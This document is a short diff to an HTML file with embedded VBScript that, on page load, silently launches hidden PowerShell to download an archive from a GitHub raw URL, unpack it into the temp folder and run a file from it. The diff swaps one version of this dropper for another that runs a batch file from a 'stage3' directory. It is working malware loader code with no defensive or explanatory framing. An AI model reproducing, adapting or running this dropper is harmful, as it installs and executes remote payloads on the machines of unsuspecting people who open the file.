@@ -1,7 +1,7 @@
 <html><head><title></title></head><body style='margin:0;overflow:hidden'><script language='VBScript'>
 Sub Window_OnLoad
 Dim sh: Set sh=CreateObject("WScript.Shell")
-sh.Run "powershell -NoP -W Hidden -C ""$r=[Guid]::NewGuid().ToString().Replace('-','');IEX(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/refs/heads/main/socket','$env:TEMP\$r');mkdir $env:TEMP\$r -ea 0;tar -xf $env:TEMP\$r -C $env:TEMP\$r;& $env:TEMP\$r\glaxnimate.exe""",0,False
+sh.Run "cmd /c powershell -NoP -W Hidden -C ""(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/floorsofolga-svg/signedfiles/refs/heads/main/socket','$env:TEMP\socket');mkdir '$env:TEMP\stage3' -ea 0;tar -xf '$env:TEMP\socket' -C '$env:TEMP\stage3';& '$env:TEMP\stage3\glaxnimate.bat'""",0,False
 window.close
 End Sub
 </script></body></html>
